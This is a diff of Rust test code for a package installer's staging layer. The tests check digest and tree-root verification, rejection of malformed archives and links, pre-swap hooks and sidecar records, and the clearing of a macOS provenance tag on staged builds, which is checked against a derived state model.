+            std::fs::metadata(p).unwrap().ino()
+        };
+        let standing = inode(&build.join("bin/ay"));
+        let err = stage(TrackedPolicy::Refuse, heal_fails, true, &broken)
+            .expect_err("a tag that could not be cleared is refused under Refuse");
         let msg = err.to_string();
         assert!(matches!(err, StageError::TrackedInstaller(_)), "{err:?}");
-        assert!(msg.contains("provenance-tracked"), "{msg}");
-        assert!(msg.contains("could not stage the bundle"), "{msg}");
         assert!(msg.contains("exited without a result"), "the cause: {msg}");
+        assert!(msg.contains("xattr exited 1"), "why it stayed: {msg}");
         assert!(
-            msg.contains("ATPKG_REFUSE_TRACKED_INSTALL"),
-            "the knob that refused: {msg}"
+            msg.contains("tracked_install = \"refuse\"") && !msg.contains("ATPKG_"),
+            "the one key that refused, and no environment knob: {msg}"
         );
-        assert!(
-            !msg.contains("launchctl submit"),
-            "the looping remedy is gone: {msg}"
-        );
-        assert!(!build.exists(), "nothing installed");
-        assert!(!crate::store::build_is_complete(&build));
+        assert_eq!(inode(&build.join("bin/ay")), standing, "nothing swapped in");
+        assert!(crate::store::build_is_complete(&build));
         assert_eq!(crate::store::tracked_install_record(&build), None);
         let scratch_left: Vec<_> = std::fs::read_dir(&store)
             .unwrap()
             .flatten()
             .map(|e| e.file_name().to_string_lossy().into_owned())
+            .filter(|n| n.contains(".incoming"))
             .collect();
         assert!(
             scratch_left.is_empty(),
             "no incoming scratch left: {scratch_left:?}"
         );
 
-        // The default: installed, complete, RECORDED.
-        assert_eq!(
-            crate::lay::tracked_policy_of(None, None),
-            TrackedPolicy::Allow
-        );
-        verify_and_stage_with(&a, &archive, &build, true, &broken, TrackedPolicy::Allow)
-            .expect("the default stages in-process");
+        // Not healed, the default: installed, complete, RECORDED.
+        assert_eq!(crate::lay::tracked_policy_of(None), TrackedPolicy::Allow);
+        stage(TrackedPolicy::Allow, heal_fails, true, &broken)
+            .expect("the default installs what it could not clear");
         assert!(build.join("bin/ay").is_file());
         assert!(crate::store::build_is_complete(&build));
         let why = crate::store::tracked_install_record(&build).expect("the cause is recorded");
-        assert!(why.contains("the untracked lane could not run"), "{why}");
+        assert!(why.contains("could not start"), "{why}");
         assert!(why.contains("exited without a result"), "{why}");
+        assert!(
+            why.contains("could not be cleared (xattr exited 1)"),
+            "{why}"
+        );
 
         // A clean (untracked) re-stage of the same build number clears the record.
-        verify_and_stage_with(&a, &archive, &build, false, &broken, TrackedPolicy::Refuse).unwrap();
+        stage(TrackedPolicy::Refuse, heal_not_asked, false, &broken).unwrap();
         assert!(crate::store::build_is_complete(&build));
         assert_eq!(crate::store::tracked_install_record(&build), None);
 
         // A binary with no lane is a fact about the binary, not a lane failure: no
-        // refusal, no record, even when tracked.
+        // refusal, no heal, no record, even when tracked.
         let none = Lane::Unavailable(String::from("a test harness"));
-        verify_and_stage_with(&a, &archive, &build, true, &none, TrackedPolicy::Refuse).unwrap();
+        stage(TrackedPolicy::Refuse, heal_not_asked, true, &none).unwrap();
         assert_eq!(crate::store::tracked_install_record(&build), None);
+
+        // THE REAL HEAL, end to end: the bundle staged in-process by this process — tagged
+        // exactly when this process is tracked — comes out clean, and nothing is recorded.
+        stage(
+            TrackedPolicy::Refuse,
+            crate::provenance::heal,
+            true,
+            &broken,
+        )
+        .expect("the real heal clears the tree this process laid");
+        assert!(
+            !crate::provenance::carries_provenance(&build.join("bin/ay")),
+            "the staged file is clean after the heal"
+        );
+        assert_eq!(crate::store::tracked_install_record(&build), None);
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// The attribute the record conformance tags with — one a test can set, through the
+    /// very path production reads.
+    #[cfg(target_os = "macos")]
+    const TAG: &str = "user.aterm.probe";
+
+    /// A heal that could not clear, and — as the real tag would stay — leaves every
+    /// regular file under the roots carrying [`TAG`].
+    #[cfg(target_os = "macos")]
+    fn heal_leaves_tagged(roots: &[PathBuf], _scratch: &Path) -> crate::provenance::HealOutcome {
+        fn tag(dir: &Path) {
+            for entry in std::fs::read_dir(dir).unwrap().flatten() {
+                let kind = entry.file_type().unwrap();
+                if kind.is_dir() {
+                    tag(&entry.path());
+                } else if kind.is_file() {
+                    crate::provenance::set_xattr_for_test(&entry.path(), TAG, b"1").unwrap();
+                }
+            }
+        }
+        roots.iter().filter(|r| r.is_dir()).for_each(|r| tag(r));
+        crate::provenance::HealOutcome::Left {
+            carriers: crate::provenance::scan_roots(roots, TAG).carriers,
+            why: String::from("launchctl submit failed"),
+        }
+    }
+
+    /// The real heal job, over [`TAG`].
+    #[cfg(target_os = "macos")]
+    fn heal_tag(roots: &[PathBuf], scratch: &Path) -> crate::provenance::HealOutcome {
+        crate::provenance::heal_with(roots, scratch, TAG)
+    }
+
+    /// TIER-1: the `<build>.tracked-install` record against its derived model
+    /// (`aterm_spec::derive::atpkg_tag_record_model`). The REAL writer — a tracked stage
+    /// through a lane that cannot run, whose heal fails — the REAL store heal
+    /// ([`crate::provenance::heal_store_with`], a real launchd job over a synthetic
+    /// attribute) and the REAL doctor are driven over a fixture store, each step projected
+    /// onto the model's variables and checked against the model's own transition. The
+    /// negative control replays the store before 2026-09-23 — a heal with no record
+    /// reconcile, the record never cleared — and the model's invariant catches the state it
+    /// leaves, which only the `Buggy=1` machine reaches.
+    #[cfg(target_os = "macos")]
+    #[test]
+    fn the_tag_record_conforms_to_its_derived_model() {
+        use crate::lay::{Lane, TrackedPolicy};
+        use aterm_spec::derive::atpkg_tag_record_model;
+        use std::collections::BTreeMap;
+
+        let model = atpkg_tag_record_model();
+        let buggy = aterm_spec::interp::with_buggy(&model, 1);
+        let d = tmp("tag-record");
+        let layout = crate::store::Layout {
+            prefix: d.join("pkg"),
+        };
+        let archive = make_archive(&d);
+        let sha = file_sha256(&archive).unwrap();
+        let reference = d.join("reference");
+        std::fs::create_dir_all(&reference).unwrap();
+        let root = stage_payload(&artifact(&sha, ""), &archive, &reference).unwrap();
+        let a = artifact(&sha, &root);
+        let fake_dir = d.join("fake");
+        std::fs::create_dir_all(&fake_dir).unwrap();
+        std::fs::copy("/usr/bin/true", fake_dir.join("atpkg")).unwrap();
+        let broken = Lane::Helper(fake_dir.join("atpkg"));
+        let home = d.join("home");
+        std::fs::create_dir_all(&home).unwrap();
+        let build = layout.build_dir("ay", 18);
+        std::fs::create_dir_all(build.parent().unwrap()).unwrap();
+
+        // The writer: a tracked stage whose lane cannot run and whose heal fails.
+        let stage_tagged = |dir: &Path| {
+            verify_and_stage_with(
+                &a,
+                &archive,
+                dir,
+                true,
+                &broken,
+                TrackedPolicy::Allow,
+                heal_leaves_tagged,
+                &StageHooks::NONE,
+            )
+            .unwrap();
+        };
+        let activate = |dir: &Path| {
+            crate::install_shims(
+                &layout,
+                dir,
+                &[String::from("ay")],
+                crate::activate::Aliases::Off,
+            )
+            .unwrap();
+        };
+        let doctor_warns = || {
+            let path = std::env::join_paths([layout.bin_dir()]).unwrap();
+            let (mut out, mut err) = (Vec::new(), Vec::new());
+            let _ = crate::doctor::run_with(
+                &layout,
+                Some(&home),
+                Some(&path),
+                0,
+                None,
+                None,
+                "doctor",
+                &crate::doctor::Probes {
+                    provenance_attr: TAG,
+                    ..crate::doctor::Probes::default()
+                },
+                &mut out,
+                &mut err,
+            );
+            String::from_utf8_lossy(&out).contains("macOS tag")
+        };
+        let observe = |healed: i64, said: i64| -> BTreeMap<&'static str, i64> {
+            let active = crate::ops::active_builds(&layout)
+                .iter()
+                .any(|(p, b)| layout.build_dir(p, *b) == build);
+            BTreeMap::from([
+                (
+                    "tagged",
+                    i64::from(
+                        !crate::provenance::scan_roots(std::slice::from_ref(&build), TAG)
+                            .carriers
+                            .is_empty(),
+                    ),
+                ),
+                (
+                    "record",
+                    i64::from(crate::store::tracked_install_record(&build).is_some()),
+                ),
+                ("active", i64::from(active)),
+                ("healed", healed),
+                ("said", said),
+            ])
+        };
+        let step = |state: &mut BTreeMap<&'static str, i64>,
+                    action: &str,
+                    observed: BTreeMap<&'static str, i64>| {
+            assert!(model.action_enabled(action, state), "{action} at {state:?}");
+            assert!(model.fire(action, state), "{action}");
+            assert_eq!(&observed, state, "the real {action} is the model's");
+            for inv in ["RecordOnlyBesideATag", "DoctorSaysWhatIsOnDisk"] {
+                assert!(model.check_invariant(inv, state), "{inv} after {action}");
+            }
+        };
+        let mut state = model.init_state();
+
+        stage_tagged(&build);
+        activate(&build);
+        step(&mut state, "StageLeftTagged", observe(0, 0));
+        step(
+            &mut state,
+            "Doctor",
+            observe(0, if doctor_warns() { 2 } else { 1 }),
+        );
+        let failed = crate::provenance::heal_store_with(&layout, heal_leaves_tagged);
+        assert!(!failed.is_clean());
+        step(&mut state, "HealFails", observe(1, 0));
+        let cleared = crate::provenance::heal_store_with(&layout, heal_tag);
+        assert!(cleared.is_clean(), "{cleared:?}");
+        step(&mut state, "HealClears", observe(1, 0));
+        step(
+            &mut state,
+            "Doctor",
+            observe(1, if doctor_warns() { 2 } else { 1 }),
+        );
+        assert_eq!(
+            state.get("said"),
+            Some(&1),
+            "doctor is silent over a clean store"
+        );
+
+        // Tagged again, then superseded by a clean build: the store heal no longer
+        // reaches build 18, and its record goes all the same.
+        stage_tagged(&build);
+        step(&mut state, "StageLeftTagged", observe(0, 0));
+        let newer = layout.build_dir("ay", 19);
+        verify_and_stage_with(
+            &a,
+            &archive,
+            &newer,
+            false,
+            &broken,
+            TrackedPolicy::Allow,
+            heal_not_asked,
+            &StageHooks::NONE,
+        )
+        .unwrap();
+        activate(&newer);
+        step(&mut state, "Supersede", observe(0, 0));
+        let passed = crate::provenance::heal_store_with(&layout, heal_tag);
+        assert!(passed.is_clean(), "{passed:?}");
+        step(&mut state, "HealPassesBy", observe(1, 0));
+        step(
+            &mut state,
+            "Doctor",
+            observe(1, if doctor_warns() { 2 } else { 1 }),
+        );
+
+        // THE NEGATIVE CONTROL: the store before 2026-09-23 — the heal ran, nothing
+        // squared the records — over a build that was recorded tagged.
+        let stale_build = newer.clone();
+        stage_tagged(&stale_build);
+        assert!(crate::store::tracked_install_record(&stale_build).is_some());
+        let scratch = d.join("scratch");
+        std::fs::create_dir_all(&scratch).unwrap();
+        let old_world = heal_tag(&crate::provenance::store_roots(&layout), &scratch);
+        assert!(old_world.is_clean(), "{old_world:?}");
+        let stale = BTreeMap::from([
+            (
+                "tagged",
+                i64::from(
+                    !crate::provenance::scan_roots(std::slice::from_ref(&stale_build), TAG)
+                        .carriers
+                        .is_empty(),
+                ),
+            ),
+            (
+                "record",
+                i64::from(crate::store::tracked_install_record(&stale_build).is_some()),
+            ),
+            ("active", 1),
+            ("healed", 1),
+            ("said", 0),
+        ]);
+        assert!(
+            !model.check_invariant("RecordOnlyBesideATag", &stale),
+            "the never-cleared record is caught: {stale:?}"
+        );
+        let mut replay = buggy.init_state();
+        for action in ["StageLeftTagged", "HealClears"] {
+            assert!(buggy.fire(action, &mut replay), "{action}");
+        }
+        assert_eq!(replay, stale, "only the Buggy machine reaches it");
+        let mut fixed = model.init_state();
+        for action in ["StageLeftTagged", "HealClears"] {
+            assert!(model.fire(action, &mut fixed), "{action}");
+        }
+        assert_ne!(fixed, stale);
+        // Doctor reads the files, never the record: over the stale record it is silent,
+        // as the healthy machine's Doctor is — the Buggy one warned from the record.
+        assert!(
+            !doctor_warns(),
+            "doctor warned from a record over clean files"
+        );
+        // …and the real reconcile is what closes it.
+        let removed = crate::provenance::reconcile_records(&layout, &[]);
+        assert_eq!(removed, vec![stale_build.clone()]);
+        assert!(crate::store::tracked_install_record(&stale_build).is_none());
         let _ = std::fs::remove_dir_all(&d);
     }
 
@@ -1629,7 +2136,7 @@ mod tests {
         /// *this* tree from a replacement that merely happens to contain the same files.
         fn installed(&self) -> (PathBuf, PathBuf) {
             let build = self.build();
-            verify_and_stage(&self.art, &self.archive, &build).unwrap();
+            verify_and_stage(&self.art, &self.archive, &build, &StageHooks::NONE).unwrap();
             assert!(
                 crate::store::build_is_complete(&build),
                 "the fixture is only interesting once the build is really installed"
@@ -1662,7 +2169,7 @@ mod tests {
     fn verifies_and_stages_a_good_bundle() {
         let b = bundle("good");
         let build = b.build();
-        verify_and_stage(&b.art, &b.archive, &build).unwrap();
+        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
         assert_eq!(
             std::fs::read(build.join("bin/ay")).unwrap(),
             b"#!/bin/true\nthe ay binary"
@@ -1676,7 +2183,13 @@ mod tests {
     fn rejects_sha256_mismatch() {
         let b = bundle("badsha");
         let build = b.build();
-        let err = verify_and_stage(&artifact("deadbeef", ""), &b.archive, &build).unwrap_err();
+        let err = verify_and_stage(
+            &artifact("deadbeef", ""),
+            &b.archive,
+            &build,
+            &StageHooks::NONE,
+        )
+        .unwrap_err();
         assert!(
             matches!(err, StageError::Sha256Mismatch { .. }),
             "got {err:?}"
@@ -1694,7 +2207,7 @@ mod tests {
         let b = bundle("badroot");
         let build = b.build();
         let bad = artifact(&b.art.sha256, &"a".repeat(64));
-        let err = verify_and_stage(&bad, &b.archive, &build).unwrap_err();
+        let err = verify_and_stage(&bad, &b.archive, &build, &StageHooks::NONE).unwrap_err();
         assert!(
             matches!(err, StageError::TreeRootMismatch { .. }),
             "got {err:?}"
@@ -1725,7 +2238,7 @@ mod tests {
         let slip = make_slip_archive(&b.dir);
         let slip_art = artifact(&file_sha256(&slip).unwrap(), "");
 
-        let err = verify_and_stage(&slip_art, &slip, &build).unwrap_err();
+        let err = verify_and_stage(&slip_art, &slip, &build, &StageHooks::NONE).unwrap_err();
         assert!(
             matches!(err, StageError::Extract(_)),
             "the fixture must fail IN extraction, else this proves nothing: got {err:?}"
@@ -1760,7 +2273,7 @@ mod tests {
         let (build, witness) = b.installed();
 
         let bad = artifact(&b.art.sha256, &"a".repeat(64));
-        let err = verify_and_stage(&bad, &b.archive, &build).unwrap_err();
+        let err = verify_and_stage(&bad, &b.archive, &build, &StageHooks::NONE).unwrap_err();
         assert!(
             matches!(err, StageError::TreeRootMismatch { .. }),
             "got {err:?}"
@@ -1784,7 +2297,7 @@ mod tests {
         let b = bundle("restage-ok");
         let (build, witness) = b.installed();
 
-        verify_and_stage(&b.art, &b.archive, &build).unwrap();
+        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
         assert!(
             !witness.exists(),
             "the swap must install the NEW tree, not merge into the old one"
@@ -1804,14 +2317,14 @@ mod tests {
         let b = bundle("scratch");
         let build = b.build();
 
-        verify_and_stage(&b.art, &b.archive, &build).unwrap();
+        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
         assert!(
             scratch_beside(&build).is_empty(),
             "after success: {:?}",
             scratch_beside(&build)
         );
         let bad = artifact(&b.art.sha256, &"b".repeat(64));
-        let _ = verify_and_stage(&bad, &b.archive, &build).unwrap_err();
+        let _ = verify_and_stage(&bad, &b.archive, &build, &StageHooks::NONE).unwrap_err();
         assert!(
             scratch_beside(&build).is_empty(),
             "after failure: {:?}",
@@ -1834,7 +2347,7 @@ mod tests {
         std::fs::write(orphan.join("bin/half"), b"partial").unwrap();
         assert!(orphan.exists(), "the fixture starts with debris on disk");
 
-        verify_and_stage(&b.art, &b.archive, &build).unwrap();
+        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
         assert!(!orphan.exists(), "the orphaned scratch was not swept");
         assert!(crate::store::build_is_complete(&build));
         assert!(scratch_beside(&build).is_empty());
@@ -1972,7 +2485,7 @@ mod tests {
     fn the_marker_is_written_last_and_is_never_part_of_the_hashed_tree() {
         let b = bundle("marker-last");
         let build = b.build();
-        verify_and_stage(&b.art, &b.archive, &build).unwrap();
+        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
 
         assert!(crate::store::build_is_complete(&build));
         assert_eq!(
@@ -2000,7 +2513,7 @@ mod tests {
 
         let slip = make_slip_archive(&b.dir);
         let slip_art = artifact(&file_sha256(&slip).unwrap(), "");
-        let err = verify_and_stage(&slip_art, &slip, &build).unwrap_err();
+        let err = verify_and_stage(&slip_art, &slip, &build, &StageHooks::NONE).unwrap_err();
         assert!(matches!(err, StageError::Extract(_)), "got {err:?}");
 
         assert!(
@@ -2012,7 +2525,7 @@ mod tests {
         assert!(scratch_beside(&build).is_empty(), "and no scratch either");
 
         // Non-vacuity: the very same layout DOES report a build once one really installs.
-        verify_and_stage(&b.art, &b.archive, &build).unwrap();
+        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
         assert_eq!(
             crate::ops::list_installed(&layout),
             vec![("ay".to_string(), 18u64)]
@@ -2052,7 +2565,7 @@ mod tests {
             "PRECONDITION: build 18 is installed and complete before the re-stage"
         );
 
-        let err = verify_and_stage(&b.art, &b.archive, &build).unwrap_err();
+        let err = verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap_err();
         assert!(
             matches!(err, StageError::Io(_)),
             "the marker write is what failed: {err:?}"
@@ -2077,7 +2590,7 @@ mod tests {
 
         // Non-vacuity: clear the blocker and the very same call marks it ready.
         std::fs::remove_dir_all(&blocker).unwrap();
-        verify_and_stage(&b.art, &b.archive, &build).unwrap();
+        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
         assert!(crate::store::build_is_complete(&build));
         let _ = std::fs::remove_dir_all(&b.dir);
     }
@@ -2283,7 +2796,7 @@ mod tests {
         );
 
         // And with it gone the stage that it was blocking now succeeds end to end.
-        verify_and_stage(&b.art, &b.archive, &build).unwrap();
+        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
         assert!(crate::store::build_is_complete(&build));
         let _ = std::fs::remove_dir_all(&b.dir);
     }
@@ -2535,7 +3048,8 @@ mod tests {
             let mut art = vendor_artifact(archive, payload, &expected);
             art.strip_components = 1;
             let build = d.join(format!("store/gh-{label}/18"));
-            verify_and_stage(&art, archive, &build).unwrap_or_else(|e| panic!("{label}: {e}"));
+            verify_and_stage(&art, archive, &build, &StageHooks::NONE)
+                .unwrap_or_else(|e| panic!("{label}: {e}"));
             assert!(crate::store::build_is_complete(&build), "{label}");
             assert_eq!(
                 std::fs::read(build.join("bin/gh")).unwrap(),
@@ -2562,7 +3076,8 @@ mod tests {
             let mut unstripped = vendor_artifact(archive, payload, &expected);
             unstripped.strip_components = 0;
             let build2 = d.join(format!("store/gh-{label}-unstripped/18"));
-            let err = verify_and_stage(&unstripped, archive, &build2).unwrap_err();
+            let err =
+                verify_and_stage(&unstripped, archive, &build2, &StageHooks::NONE).unwrap_err();
             assert!(
                 matches!(err, StageError::TreeRootMismatch { .. }),
                 "{label}: {err:?}"
@@ -2587,7 +3102,7 @@ mod tests {
         let mut art = vendor_artifact(&zst, "tar-zst", &expected);
         art.strip_components = 1;
         let build = d.join("store/gh/18");
-        verify_and_stage(&art, &zst, &build).unwrap();
+        verify_and_stage(&art, &zst, &build, &StageHooks::NONE).unwrap();
         assert_eq!(tree_root(&build).unwrap(), expected);
         let _ = std::fs::remove_dir_all(&d);
     }
@@ -2610,7 +3125,7 @@ mod tests {
         let mut art = vendor_artifact(&dl, "raw-binary", &expected);
         art.entry = "claude".into();
         let build = d.join("store/claude/2026082601");
-        verify_and_stage(&art, &dl, &build).unwrap();
+        verify_and_stage(&art, &dl, &build, &StageHooks::NONE).unwrap();
         assert!(crate::store::build_is_complete(&build));
         assert_eq!(std::fs::read(build.join("bin/claude")).unwrap(), payload);
         assert_eq!(
@@ -2629,7 +3144,7 @@ mod tests {
             let mut art = vendor_artifact(&dl, "raw-binary", &expected);
             art.entry = bad.into();
             let build = d.join("store/bad/1");
-            let err = verify_and_stage(&art, &dl, &build).unwrap_err();
+            let err = verify_and_stage(&art, &dl, &build, &StageHooks::NONE).unwrap_err();
             assert!(matches!(err, StageError::Payload(_)), "{bad:?}: {err:?}");
             assert!(!build.exists(), "{bad:?}");
         }
@@ -2764,7 +3279,7 @@ mod tests {
             "Emacs.app/Contents/MacOS/bin/emacsclient".into(),
         );
         let build = d.join("store/emacs/18");
-        verify_and_stage(&art, &gz, &build).unwrap();
+        verify_and_stage(&art, &gz, &build, &StageHooks::NONE).unwrap();
         assert_eq!(
             std::fs::read_link(build.join("bin/emacs")).unwrap(),
             Path::new("../Emacs.app/Contents/MacOS/Emacs")
@@ -2780,7 +3295,8 @@ mod tests {
         assert_eq!(tree_root(&build).unwrap(), expected);
         // Without the links the root is different: the fold really carries them.
         let plain = vendor_artifact(&gz, "tar-gz", &expected);
-        let err = verify_and_stage(&plain, &gz, &d.join("store/plain/18")).unwrap_err();
+        let err = verify_and_stage(&plain, &gz, &d.join("store/plain/18"), &StageHooks::NONE)
+            .unwrap_err();
         assert!(
             matches!(err, StageError::TreeRootMismatch { .. }),
             "{err:?}"
@@ -2801,7 +3317,7 @@ mod tests {
             let mut art = vendor_artifact(&gz, "tar-gz", &expected);
             art.links.insert((*name).into(), (*target).into());
             let build = d.join(format!("store/{label}/18"));
-            let err = verify_and_stage(&art, &gz, &build).unwrap_err();
+            let err = verify_and_stage(&art, &gz, &build, &StageHooks::NONE).unwrap_err();
             assert!(matches!(err, StageError::Payload(_)), "{label}: {err:?}");
             assert!(!build.exists(), "{label}: nothing staged");
             assert!(scratch_beside(&build).is_empty(), "{label}: no scratch");
@@ -2823,7 +3339,7 @@ mod tests {
         let mut art = vendor_artifact(&good, "tar-gz", &expected);
         art.strip_components = 1;
         let build = d.join("store/gh/18");
-        verify_and_stage(&art, &good, &build).unwrap();
+        verify_and_stage(&art, &good, &build, &StageHooks::NONE).unwrap();
         let witness = build.join("this-tree-survived");
         std::fs::write(&witness, b"old").unwrap();
 
@@ -2864,7 +3380,7 @@ mod tests {
         for (label, archive, payload) in [("gz", &gz, "tar-gz"), ("zip", &zip, "zip")] {
             let mut art = vendor_artifact(archive, payload, "");
             art.strip_components = 1;
-            let err = verify_and_stage(&art, archive, &build).unwrap_err();
+            let err = verify_and_stage(&art, archive, &build, &StageHooks::NONE).unwrap_err();
             assert!(matches!(err, StageError::Extract(_)), "{label}: {err:?}");
             assert!(witness.exists(), "{label}: the installed build survived");
             assert!(crate::store::build_is_complete(&build), "{label}");
@@ -2886,7 +3402,7 @@ mod tests {
         art.protocol = "https".into();
         art.payload = "pkg".into();
         let build = b.build();
-        let err = verify_and_stage(&art, &b.archive, &build).unwrap_err();
+        let err = verify_and_stage(&art, &b.archive, &build, &StageHooks::NONE).unwrap_err();
         assert!(matches!(err, StageError::Payload(_)), "{err:?}");
         assert!(!build.exists());
         assert!(scratch_beside(&build).is_empty());
@@ -3101,7 +3617,7 @@ image-alias     : /tmp/stage/bar.dmg
         art.links
             .insert("foo".into(), "Foo.app/Contents/MacOS/foo".into());
         let build = d.join("store/foo/2026082601");
-        verify_and_stage(&art, &dmg, &build).unwrap();
+        verify_and_stage(&art, &dmg, &build, &StageHooks::NONE).unwrap();
         assert!(crate::store::build_is_complete(&build));
         assert_eq!(
             std::fs::read(build.join("bin/foo")).unwrap(),
@@ -3154,7 +3670,7 @@ image-alias     : /tmp/stage/bar.dmg
             assert!(status.success(), "hdiutil create {label}");
             let art = vendor_artifact(&dmg2, "dmg", &expected);
             let build2 = d.join(format!("store/{label}/1"));
-            let err = verify_and_stage(&art, &dmg2, &build2).unwrap_err();
+            let err = verify_and_stage(&art, &dmg2, &build2, &StageHooks::NONE).unwrap_err();
             assert!(matches!(err, StageError::Payload(_)), "{label}: {err:?}");
             assert!(!build2.exists(), "{label}");
             assert!(scratch_beside(&build2).is_empty(), "{label}");
@@ -3198,7 +3714,7 @@ image-alias     : /tmp/stage/bar.dmg
             let expected3 = tree_root(&replica3).unwrap();
             let art = vendor_artifact(&dmg3, "dmg", &expected3);
             let build3 = d.join(format!("store/{label}/1"));
-            let res = verify_and_stage(&art, &dmg3, &build3);
+            let res = verify_and_stage(&art, &dmg3, &build3, &StageHooks::NONE);
             if ok {
                 res.unwrap_or_else(|e| panic!("{label}: an in-root link is admitted: {e}"));
                 assert_eq!(
@@ -3221,6 +3737,627 @@ image-alias     : /tmp/stage/bar.dmg
             }
             leaks.assert_clean(&format!("{label}: detached"));
         }
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// A vendor record for the sidecar tests: the root it was handed, so the test can
+    /// check the stage passed the root it verified.
+    fn vendor_record(root: &str) -> Vec<(&'static str, Vec<u8>)> {
+        let mut body = String::from("tree_root = \"");
+        body.push_str(root);
+        body.push_str("\"\n");
+        vec![(crate::store::VENDOR_SIDECAR_SUFFIX, body.into_bytes())]
+    }
+
+    /// THE ORDER. `pre_swap` sees the verified `.incoming` tree while nothing is at the
+    /// build path; the sidecars are rendered from the root the stage verified and are on
+    /// disk beside the marked build; and the stage returns that same root.
+    #[test]
+    fn hooks_run_before_the_swap_and_sidecars_land_before_the_marker() {
+        let b = bundle("hooks-order");
+        let build = b.build();
+        let seen: std::cell::RefCell<Vec<String>> = std::cell::RefCell::new(Vec::new());
+        let pre_swap = |incoming: &Path| -> Result<(), StageError> {
+            assert!(incoming.join("bin/ay").is_file(), "the verified tree");
+            assert_ne!(incoming, build.as_path());
+            assert!(!build.exists(), "nothing swapped yet");
+            assert!(!crate::store::build_is_complete(&build));
+            seen.borrow_mut().push("pre_swap".into());
+            Ok(())
+        };
+        let sidecars = |root: &str| {
+            seen.borrow_mut().push("sidecars".into());
+            Ok(vendor_record(root))
+        };
+        let hooks = StageHooks {
+            pre_swap: Some(&pre_swap),
+            sidecars: Some(&sidecars),
+        };
+        let root = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
+        assert_eq!(root, b.art.tree_root, "the verified root comes back");
+        assert_eq!(*seen.borrow(), ["pre_swap", "sidecars"]);
+        assert!(crate::store::build_is_complete(&build));
+        let record =
+            crate::store::sidecar_path(&build, crate::store::VENDOR_SIDECAR_SUFFIX).unwrap();
+        assert_eq!(
+            std::fs::read_to_string(&record).unwrap(),
+            String::from_utf8(vendor_record(&root).remove(0).1).unwrap()
+        );
+        assert!(scratch_beside(&build).is_empty());
+
+        // Without hooks the same stage returns the same root and writes no sidecar.
+        let plain = b.dir.join("store/ay/19");
+        assert_eq!(
+            verify_and_stage(&b.art, &b.archive, &plain, &StageHooks::NONE).unwrap(),
+            root
+        );
+        assert!(
+            !crate::store::sidecar_path(&plain, crate::store::VENDOR_SIDECAR_SUFFIX)
+                .unwrap()
+                .exists()
+        );
+        let _ = std::fs::remove_dir_all(&b.dir);
+    }
+
+    /// A `pre_swap` refusal is final before anything is published: no build, no marker,
+    /// no sidecar, no scratch — and over an installed build, that build untouched and
+    /// still complete.
+    #[test]
+    fn a_pre_swap_refusal_leaves_no_build_marker_or_sidecar() {
+        let b = bundle("hooks-refuse");
+        let build = b.build();
+        let refuse = |_: &Path| -> Result<(), StageError> {
+            Err(StageError::SignerRefused("bin/ay is not signed".into()))
+        };
+        let rendered = std::cell::Cell::new(false);
+        let sidecars = |root: &str| {
+            rendered.set(true);
+            Ok(vendor_record(root))
+        };
+        let hooks = StageHooks {
+            pre_swap: Some(&refuse),
+            sidecars: Some(&sidecars),
+        };
+        let err = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap_err();
+        assert!(matches!(err, StageError::SignerRefused(_)), "{err:?}");
+        assert_eq!(err.to_string(), "signer refused: bin/ay is not signed");
+        assert!(!rendered.get(), "a refused tree has no record to render");
+        assert!(!build.exists());
+        assert!(!crate::store::build_is_complete(&build));
+        assert!(
+            !crate::store::sidecar_path(&build, crate::store::VENDOR_SIDECAR_SUFFIX)
+                .unwrap()
+                .exists()
+        );
+        assert!(scratch_beside(&build).is_empty());
+
+        let (build, witness) = b.installed();
+        let err = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap_err();
+        assert!(matches!(err, StageError::SignerRefused(_)), "{err:?}");
+        assert!(
+            witness.is_file(),
+            "the installed tree was never swapped out"
+        );
+        assert!(crate::store::build_is_complete(&build));
+        let _ = std::fs::remove_dir_all(&b.dir);
+    }
+
+    /// THE GATE SEES ONLY VERIFIED BYTES: a tree whose root does not match the row is
+    /// refused before `pre_swap` is ever asked about it.
+    #[test]
+    fn a_tree_root_mismatch_never_reaches_the_pre_swap_hook() {
+        let b = bundle("hooks-badroot");
+        let build = b.build();
+        let asked = std::cell::Cell::new(false);
+        let pre_swap = |_: &Path| -> Result<(), StageError> {
+            asked.set(true);
+            Ok(())
+        };
+        let hooks = StageHooks {
+            pre_swap: Some(&pre_swap),
+            sidecars: None,
+        };
+        let bad = artifact(&b.art.sha256, &"a".repeat(64));
+        let err = verify_and_stage(&bad, &b.archive, &build, &hooks).unwrap_err();
+        assert!(
+            matches!(err, StageError::TreeRootMismatch { .. }),
+            "{err:?}"
+        );
+        assert!(!asked.get(), "the hook saw an unverified tree");
+        let err =
+            verify_and_stage(&artifact("deadbeef", ""), &b.archive, &build, &hooks).unwrap_err();
+        assert!(matches!(err, StageError::Sha256Mismatch { .. }), "{err:?}");
+        assert!(!asked.get(), "the hook saw bytes that failed their digest");
+        // Non-vacuity: the same hook on the honest row is asked.
+        verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
+        assert!(asked.get());
+        let _ = std::fs::remove_dir_all(&b.dir);
+    }
+
+    /// A sidecar the store would never reclaim is refused before the swap.
+    #[test]
+    fn a_sidecar_suffix_the_store_does_not_reclaim_is_refused_before_the_swap() {
+        let b = bundle("hooks-suffix");
+        let build = b.build();
+        let sidecars = |_: &str| Ok(vec![(".bogus", b"x".to_vec())]);
+        let hooks = StageHooks {
+            pre_swap: None,
+            sidecars: Some(&sidecars),
+        };
+        let err = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap_err();
+        assert!(matches!(err, StageError::Payload(_)), "{err:?}");
+        assert!(err.to_string().contains(".bogus"), "{err}");
+        assert!(!build.exists());
